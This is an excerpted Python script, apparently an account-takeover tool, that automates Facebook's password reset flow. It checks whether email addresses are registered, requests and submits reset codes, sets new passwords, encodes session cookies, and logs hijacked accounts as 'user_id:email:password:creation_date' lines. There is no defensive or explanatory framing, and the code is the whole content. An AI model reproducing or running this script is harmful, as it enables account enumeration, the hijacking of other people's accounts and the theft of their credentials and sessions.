...
def send_reset_code(session: requests.Session, email: str) -> bool:
    ...
    if 'Engellendin' not in response:
        try:
            ...
            print(f"[+] An account registered to your e-mail address was found => {email}")
            response = session.post(
                f"https://www.facebook.com/ajax/recover/initiate/?recover_method=send_email&lara=1",
                data={
                    'lsd': lsd,
                    '__user': '0',
                    '__a': '1'
            ...
            print(f"[-] No account registered to the email address found => {email}")
    else:
...
def submit_code(session: requests.Session, email: str, code: str):
    ...
    response = session.post(
        f"https://www.facebook.com/recover/code/?em%5B0%5D={email}&rm=send_email&spc=0&fl=default_recover&wsr=0",
        data={
            'lsd': lsd,
            'n': code,
            'reset_action': '1',
    ...
    response = session.post(
        f"https://www.facebook.com/recover/password/write/?u={user_id}&n={code}&fl=default_recover&rm=send_email",
        data={
            'lsd': lsd,
            'encpass': '#PWD_BROWSER:0:0:' + password,
        },
        allow_redirects=True
    )
    cookies = b64encode(str(session.cookies.get_dict()).encode('utf-8')).decode('utf-8')
    if 'checkpoint' in response.url:
        print(f"[-] Account checkpoint => {user_id}")
        ...
        print(f"[+] Active account => {user_id}:{email}:{password}:{creation_date}")
